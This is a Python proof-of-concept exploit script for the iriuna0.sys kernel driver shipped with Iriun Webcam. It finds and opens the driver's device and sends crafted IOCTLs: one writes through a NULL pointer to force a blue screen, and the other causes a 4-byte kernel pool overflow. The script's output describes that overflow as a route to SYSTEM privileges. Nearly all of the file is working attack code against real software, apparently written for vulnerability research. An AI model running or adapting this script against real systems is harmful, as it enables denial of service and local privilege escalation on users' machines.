"""
iriun_kernel_poc.py  --  PoC for iriuna0.sys kernel vulnerabilities

Bug 1: IOCTL 0x222010 - Kernel pool buffer overflow (CWE-122/CWE-787)
Bug 2: IOCTL 0x222008 - NULL pointer dereference (CWE-476)

Usage:
    python iriun_kernel_poc.py dryrun        # Open device, confirm access
    python iriun_kernel_poc.py nullderef     # BSOD via NULL write
    python iriun_kernel_poc.py pooloverflow  # Pool corruption

WARNING: nullderef and pooloverflow WILL crash the machine.
"""

import sys
import os
import struct
import ctypes
import ctypes.wintypes as w
import winreg
import subprocess

kernel32 = ctypes.windll.kernel32
setupapi = ctypes.windll.setupapi

# --- CreateFile ---
kernel32.CreateFileW.restype = w.HANDLE
kernel32.CreateFileW.argtypes = [
    w.LPCWSTR, w.DWORD, w.DWORD, ctypes.c_void_p,
    w.DWORD, w.DWORD, w.HANDLE
]

# --- DeviceIoControl ---
kernel32.DeviceIoControl.restype = w.BOOL
kernel32.DeviceIoControl.argtypes = [
    w.HANDLE, w.DWORD,
    ctypes.c_void_p, w.DWORD,
    ctypes.c_void_p, w.DWORD,
    ctypes.POINTER(w.DWORD), ctypes.c_void_p
]

# --- SetupDi APIs ---
class GUID(ctypes.Structure):
    _fields_ = [
        ("Data1", ctypes.c_ulong),
        ("Data2", ctypes.c_ushort),
        ("Data3", ctypes.c_ushort),
        ("Data4", ctypes.c_ubyte * 8),
    ]

class SP_DEVICE_INTERFACE_DATA(ctypes.Structure):
    _fields_ = [
        ("cbSize", w.DWORD),
        ("InterfaceClassGuid", GUID),
        ("Flags", w.DWORD),
        ("Reserved", ctypes.POINTER(ctypes.c_ulong)),
    ]

class SP_DEVICE_INTERFACE_DETAIL_DATA_W(ctypes.Structure):
    _fields_ = [
        ("cbSize", w.DWORD),
        ("DevicePath", ctypes.c_wchar * 512),
    ]

setupapi.SetupDiGetClassDevsW.restype = w.HANDLE
setupapi.SetupDiGetClassDevsW.argtypes = [
    ctypes.POINTER(GUID), w.LPCWSTR, w.HWND, w.DWORD
]
setupapi.SetupDiEnumDeviceInterfaces.restype = w.BOOL
setupapi.SetupDiEnumDeviceInterfaces.argtypes = [
    w.HANDLE, ctypes.c_void_p,
    ctypes.POINTER(GUID), w.DWORD,
    ctypes.POINTER(SP_DEVICE_INTERFACE_DATA)
]
setupapi.SetupDiGetDeviceInterfaceDetailW.restype = w.BOOL
setupapi.SetupDiGetDeviceInterfaceDetailW.argtypes = [
    w.HANDLE, ctypes.POINTER(SP_DEVICE_INTERFACE_DATA),
    ctypes.POINTER(SP_DEVICE_INTERFACE_DETAIL_DATA_W), w.DWORD,
    ctypes.POINTER(w.DWORD), ctypes.c_void_p
]
setupapi.SetupDiDestroyDeviceInfoList.restype = w.BOOL
setupapi.SetupDiDestroyDeviceInfoList.argtypes = [w.HANDLE]

INVALID_HANDLE_VALUE = w.HANDLE(-1).value
GENERIC_READ  = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 3
FILE_SHARE_RW = 3
DIGCF_PRESENT         = 0x02
DIGCF_DEVICEINTERFACE = 0x10

IOCTL_PUSH  = 0x222010
IOCTL_QUERY = 0x222008
IOCTL_RESET = 0x22200C


def make_guid(s):
    """Parse a GUID string like '{6994ad04-93ef-11d0-a3cc-00a0c9223196}' into GUID struct."""
    s = s.strip("{}")
    parts = s.split("-")
    d1 = int(parts[0], 16)
    d2 = int(parts[1], 16)
    d3 = int(parts[2], 16)
    d4_hex = parts[3] + parts[4]
    d4 = (ctypes.c_ubyte * 8)(*[int(d4_hex[i:i+2], 16) for i in range(0, 16, 2)])
    g = GUID()
    g.Data1 = d1
    g.Data2 = d2
    g.Data3 = d3
    g.Data4 = d4
    return g


def enum_device_interfaces(guid_str):
    """Use SetupDi to enumerate PRESENT (enabled) device interfaces."""
    guid = make_guid(guid_str)
    h_devinfo = setupapi.SetupDiGetClassDevsW(
        ctypes.byref(guid), None, None,
        DIGCF_PRESENT | DIGCF_DEVICEINTERFACE
    )
    if h_devinfo == INVALID_HANDLE_VALUE:
        return []

    paths = []
    idx = 0
    while True:
        iface_data = SP_DEVICE_INTERFACE_DATA()
        iface_data.cbSize = ctypes.sizeof(SP_DEVICE_INTERFACE_DATA)

        ok = setupapi.SetupDiEnumDeviceInterfaces(
            h_devinfo, None, ctypes.byref(guid), idx,
            ctypes.byref(iface_data)
        )
        if not ok:
            break

        detail = SP_DEVICE_INTERFACE_DETAIL_DATA_W()
        # On x64: cbSize = 8 (DWORD + alignment for WCHAR)
        detail.cbSize = 8 if ctypes.sizeof(ctypes.c_void_p) == 8 else 6
        needed = w.DWORD(0)

        ok = setupapi.SetupDiGetDeviceInterfaceDetailW(
            h_devinfo, ctypes.byref(iface_data),
            ctypes.byref(detail), ctypes.sizeof(detail),
            ctypes.byref(needed), None
        )
        if ok:
            paths.append(detail.DevicePath)

        idx += 1

    setupapi.SetupDiDestroyDeviceInfoList(h_devinfo)
    return paths


def find_all_paths():
    """Enumerate device interfaces from SetupDi (enabled only) + registry (all)."""
    guids = [
        "{6994ad04-93ef-11d0-a3cc-00a0c9223196}",  # KSCATEGORY_AUDIO
        "{65e8773d-8f56-11d0-a3b9-00a0c9223196}",  # KSCATEGORY_CAPTURE
        "{65e8773e-8f56-11d0-a3b9-00a0c9223196}",  # KSCATEGORY_RENDER
        "{dda54a40-1e4c-11d1-a050-405705c10000}",  # KSCATEGORY_TOPOLOGY
    ]

    all_paths = []
    seen = set()

    # Method 1: SetupDi (only returns PRESENT/ENABLED interfaces)
    print("[*] Method 1: SetupDi enumeration (enabled interfaces only)...")
    for guid in guids:
        paths = enum_device_interfaces(guid)
        for p in paths:
            p_lower = p.lower()
            if "media" in p_lower or "iriun" in p_lower:
                if p_lower not in seen:
                    seen.add(p_lower)
                    all_paths.append(p)
                    print(f"    [+] ENABLED: {p}")

    # Method 2: Registry (finds registered even if not enabled)
    print("[*] Method 2: Registry enumeration (all registered interfaces)...")
    for guid in guids:
        reg_path = rf"SYSTEM\CurrentControlSet\Control\DeviceClasses\{guid}"
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
        except FileNotFoundError:
            continue
        i = 0
        while True:
            try:
                subkey_name = winreg.EnumKey(key, i)
                i += 1
            except OSError:
                break
            if "MEDIA" in subkey_name.upper():
                if subkey_name.startswith("##?#"):
                    dev_path = "\\\\?\\" + subkey_name[4:]
                    if dev_path.lower() not in seen:
                        seen.add(dev_path.lower())
                        all_paths.append(dev_path)
                        print(f"    [~] registered (may not be enabled): {dev_path}")
                    # Also check for SymbolicLink value under #\ subkey
                    try:
                        hash_key = winreg.OpenKey(key, subkey_name + "\\#")
                        try:
                            sym_link, _ = winreg.QueryValueEx(hash_key, "SymbolicLink")
                            if sym_link and sym_link.lower() not in seen:
                                seen.add(sym_link.lower())
                                all_paths.append(sym_link)
                                print(f"    [~] SymbolicLink value: {sym_link}")
                        except FileNotFoundError:
                            pass
                        winreg.CloseKey(hash_key)
                    except FileNotFoundError:
                        pass
        winreg.CloseKey(key)

    return all_paths


def check_iriun_running():
    """Check if Iriun processes are running."""
    print("[*] Checking if Iriun is running...")
    try:
        out = subprocess.check_output(
            ["tasklist", "/FI", "IMAGENAME eq IriunWebcam.exe"],
            text=True, stderr=subprocess.DEVNULL
        )
        if "IriunWebcam.exe" in out:
            print("    [+] IriunWebcam.exe is running")
            return True
        else:
            print("    [-] IriunWebcam.exe is NOT running")
            print("    [*] The audio device interface may not be enabled.")
            print("    [*] Try starting the Iriun app and connecting your phone.")
            return False
    except Exception:
        print("    [?] Could not check (tasklist failed)")
        return None


def open_device(paths):
    """Try to open the device with decreasing access levels."""
    access_levels = [
        ("GENERIC_READ|WRITE", GENERIC_READ | GENERIC_WRITE),
        ("GENERIC_READ",       GENERIC_READ),
        ("GENERIC_WRITE",      GENERIC_WRITE),
        ("zero-access",        0),
    ]

    for path in paths:
        for label, access in access_levels:
            h = kernel32.CreateFileW(path, access, FILE_SHARE_RW, None, OPEN_EXISTING, 0, None)
            if h != INVALID_HANDLE_VALUE:
                return h, path, label

    return None, None, None


def ioctl(h, code, in_buf=None, in_len=0, out_len=0):
    """Send a DeviceIoControl."""
    if in_buf is not None:
        in_arr = (ctypes.c_ubyte * len(in_buf))(*in_buf)
        in_ptr = ctypes.cast(in_arr, ctypes.c_void_p)
        in_sz  = len(in_buf)
    else:
        in_ptr = None
        in_sz  = in_len

    if out_len > 0:
        out_arr = (ctypes.c_ubyte * out_len)()
        out_ptr = ctypes.cast(out_arr, ctypes.c_void_p)
    else:
        out_arr = None
        out_ptr = None

    ret = w.DWORD(0)
    ok = kernel32.DeviceIoControl(
        h, code,
        in_ptr, in_sz,
        out_ptr, out_len,
        ctypes.byref(ret), None
    )
    out_bytes = bytes(out_arr) if out_arr else b""
    return bool(ok), ret.value, out_bytes


def main():
    if len(sys.argv) < 2 or sys.argv[1].lower() not in ("dryrun", "nullderef", "pooloverflow"):
        print(__doc__)
        return

    bug = sys.argv[1].lower()
    user = os.environ.get("USERNAME", "unknown")

    print()
    print("=" * 65)
    print("  iriuna0.sys Kernel PoC  --  Iriun Webcam Audio Driver")
    print("=" * 65)
    print()

    # Check if Iriun is running
    iriun_running = check_iriun_running()
    print()

    # Find device interfaces
    paths = find_all_paths()

    if not paths:
        print()
        print("[-] No Iriun audio device interfaces found.")
        print("    Is Iriun Webcam installed?")
        return

    print()
    print(f"[*] Found {len(paths)} path(s). Attempting to open...")
    h, used_path, access = open_device(paths)

    if h is None:
        err = ctypes.GetLastError()
        print(f"[-] Cannot open any device. Last error: {err}")
        print()

        # Detailed per-path results
        for p in paths:
            test = kernel32.CreateFileW(p, 0, FILE_SHARE_RW, None, OPEN_EXISTING, 0, None)
            e = ctypes.GetLastError()
            if test != INVALID_HANDLE_VALUE:
                print(f"    [+] {p}")
                print(f"        OPENED with zero-access")
                kernel32.CloseHandle(test)
            else:
                err_name = {
                    2: "FILE_NOT_FOUND (interface not enabled)",
                    5: "ACCESS_DENIED (DACL blocks this user)",
                    32: "SHARING_VIOLATION (device in exclusive use)",
                }.get(e, f"error {e}")
                print(f"    [-] {p}")
                print(f"        {err_name}")

        if not iriun_running:
            print()
            print("[*] TIP: Start IriunWebcam.exe and connect your phone,")
            print("    then re-run this script. The audio device interface is")
            print("    likely only enabled while Iriun is actively streaming.")
        return

    print()
    print(f"[+] ===== DEVICE OPENED =====")
    print(f"    User:   {user}")
    print(f"    Access: {access}")
    print(f"    Path:   {used_path}")
    print(f"    Handle: 0x{h:x}")

    # ── DryRun ──
    if bug == "dryrun":
        print()
        print(f"[+] DRY RUN -- {user} can open the Iriun audio kernel device.")
        print("    All custom IOCTLs use FILE_ANY_ACCESS.")
        print("    Both kernel bugs (pool overflow + NULL deref) are reachable.")
        if access in ("zero-access",):
            print()
            print("    NOTE: Opened with zero-access only.")
            print("    DeviceIoControl may still work (FILE_ANY_ACCESS IOCTLs")
            print("    bypass the handle access check).")
        kernel32.CloseHandle(h)
        return

    # ── NULL Pointer Dereference ──
    if bug == "nullderef":
        print()
        print("[**] BUG: IOCTL 0x222008 -- NULL Pointer Dereference (CWE-476)")
        print("     Handler: *(DWORD*)SystemBuffer = 1")
        print("     InLen=0, OutLen=0 --> SystemBuffer=NULL --> write to 0x0")
        print("     Impact: BSOD (SYSTEM_SERVICE_EXCEPTION)")
        print()
        input("     Press ENTER to trigger (Ctrl+C to abort)... ")

        ok, ret, _ = ioctl(h, IOCTL_QUERY, in_len=0, out_len=0)
        print(f"[?] DeviceIoControl returned: ok={ok}, bytes={ret}")
        print("    (Expected BSOD before reaching this line)")

    # ── Pool Buffer Overflow ──
    if bug == "pooloverflow":
        print()
        print("[**] BUG: IOCTL 0x222010 -- Pool Buffer Overflow (CWE-122)")
        print("     Handler writes 8 bytes to SystemBuffer unconditionally.")
        print("     OutLen=4 --> 4-byte pool alloc, 8-byte write = 4-byte overflow.")
        print()

        print("     Step 1: Reset ring buffer (IOCTL 0x22200C)...")
        ok1, _, _ = ioctl(h, IOCTL_RESET, in_len=0, out_len=0)
        print(f"     Reset: {'OK' if ok1 else 'FAILED'}")

        print()
        print("     Step 2: Trigger overflow (InLen=2, OutLen=4)")
        print("     Pool alloc = max(2,4) = 4 bytes. Write = 8 bytes.")
        print()
        input("     Press ENTER to trigger (Ctrl+C to abort)... ")

        ok, ret, out = ioctl(h, IOCTL_PUSH, in_buf=b"\x41\x41", out_len=4)

        if ok:
            print()
            print("[**] DeviceIoControl SUCCEEDED -- kernel pool corrupted!")
            print(f"     Returned {ret} bytes.")
            print(f"     OutBuf: {out.hex()}")
            print("     4-byte overflow into adjacent pool block header.")
            print("     Exploitable via pool feng shui --> arbitrary write --> SYSTEM.")
        else:
            err = ctypes.GetLastError()
            print(f"[?] DeviceIoControl failed: error {err}")

    kernel32.CloseHandle(h)
    print()
    print("[*] Done.")


if __name__ == "__main__":
    main()
